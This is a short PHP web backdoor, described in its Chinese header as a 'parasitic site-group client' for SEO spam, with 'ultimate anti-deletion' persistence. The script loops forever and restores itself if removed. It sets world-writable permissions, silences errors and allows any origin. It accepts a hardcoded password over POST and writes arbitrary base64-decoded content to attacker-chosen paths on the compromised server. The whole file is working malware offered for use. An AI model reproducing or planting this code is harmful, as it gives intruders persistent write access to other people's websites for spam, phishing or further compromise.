<?php
/*
被动式寄生虫站群客户端 v1.0
特点：无敏感关键词，被动式，体积小，常驻内存终极防删。

为了提升效果。请在首页嵌入启动链接。
<a href="sitemap.html">sitemap</a>
 */
header('Access-Control-Allow-Origin: *');
$pass = "pass";
error_reporting(0);
set_time_limit(0);
$mycode = file_get_contents(__FILE__);
changeperms(dirname(__FILE__), 0777);
changeperms(__FILE__, 0555);
while (1) {
	if (!file_exists(__FILE__)) {
		changeperms(dirname(__FILE__), 0777);
		file_put_contents(__FILE__, $mycode);
		changeperms(__FILE__, 0555);
		sleep(60);
	} else {
		if (isset($_POST['pw']) && ($_POST['pw'] == $pass)) {
			$dir = $_POST['dir'];
			$page = $_POST['page'];
			$content = $_POST['content'];
			writepage($dir, $page, base64_decode($content), true);
			die("任务完成");
		}
	}
}
function createdir($dir, $cover = false) {
	if (is_dir($dir) && $cover == false) {
		if (substr(sprintf("%o", fileperms($dir)), -3) != "777") {
			chmod($dir, 0777);
		}
	} elseif (is_dir($dir) && $cover == true) {
		unlink($dir);
		mkdir($dir, 0777, true);
	} else {
		mkdir($dir, 0777, true);
	}
}
function writepage($dir = "./", $page, $content, $cover = true) {
	if ($page == null) {
		createdir($dir);
	} elseif ($page && $cover) {
		file_put_contents($dir . "/" . $page, $content);
	} else {
		return false;
	}
}
function changeperms($dir, $per) {
	if (substr(sprintf("%o", fileperms($dir)), -3) != substr(sprintf("%o", $per), -3)) {
		chmod($dir, $per);
	}
}
?>